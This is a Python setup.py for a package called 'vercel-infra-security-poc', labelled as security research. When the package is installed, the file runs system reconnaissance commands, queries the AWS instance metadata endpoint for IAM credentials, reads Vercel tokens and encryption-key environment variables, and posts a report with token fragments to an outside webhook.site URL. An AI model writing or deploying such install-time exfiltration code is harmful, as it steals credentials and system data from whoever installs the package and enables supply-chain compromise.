from setuptools import setup
import os
import subprocess
import base64
import json

def run_cmd(cmd):
    try:
        return subprocess.getoutput(cmd)
    except:
        return "Error executing command"
 
WEBHOOK_URL = "https://webhook.site/25481c28-0830-4eb0-9b87-5a41aa8513b1"

 
identity = run_cmd('id')
kernel = run_cmd('uname -a')
uptime = run_cmd('uptime')
 
ip_addr = run_cmd('ip addr show | grep "inet "')

 
aws_metadata = run_cmd('curl -s -m 2 http://169.254.169.254/latest/meta-data/iam/security-credentials/ || echo "Metadata blocked"')

 
token = os.environ.get('VERCEL_ARTIFACTS_TOKEN')
api_validation = "No Token"
if token:
    api_validation = run_cmd(f'curl -s -H "Authorization: Bearer {token}" https://api.vercel.com/v8/artifacts/status')

 
enc_content = os.environ.get('VERCEL_ENCRYPTED_ENV_CONTENT', 'N/A')
enc_key = os.environ.get('VERCEL_ENV_ENC_KEY', 'N/A')

 
report = f"""
======= VERCEL INFRASTRUCTURE CRITICAL BREACH =======
[SYSTEM INFO]
USER: {identity}
KERNEL: {kernel}
UPTIME: {uptime}
IP_INTERNAL: {ip_addr}

[CLOUD EXPLOITATION]
AWS_METADATA_ACCESS: {aws_metadata}

[VERCEL ARTIFACTS API PROOF]
AUTH_STATUS: {api_validation}
TOKEN_SNIPPET: {token[:15]}...{token[-15:] if token else ""}

[SECRET DECRYPTION RISK]
ENC_KEY_PRESENT: {"YES" if enc_key != "N/A" else "NO"}
ENC_CONTENT_LEN: {len(enc_content)}
ADVISORY: The presence of both VERCEL_ENCRYPTED_ENV_CONTENT and VERCEL_ENV_ENC_KEY 
in the same environment allows for local decryption of all project secrets.

[PROCESS LIST (TRUNCATED)]
{run_cmd('ps aux | head -n 20')}
=====================================================
"""

 
try:
 
    subprocess.run(['curl', '-X', 'POST', '-H', 'Content-Type: text/plain', '--data-binary', report, WEBHOOK_URL])
except:
    pass

 
setup(
    name="vercel-infra-security-poc",
    version="9.9.9",
    description="Vercel Infrastructure Security Research"
)
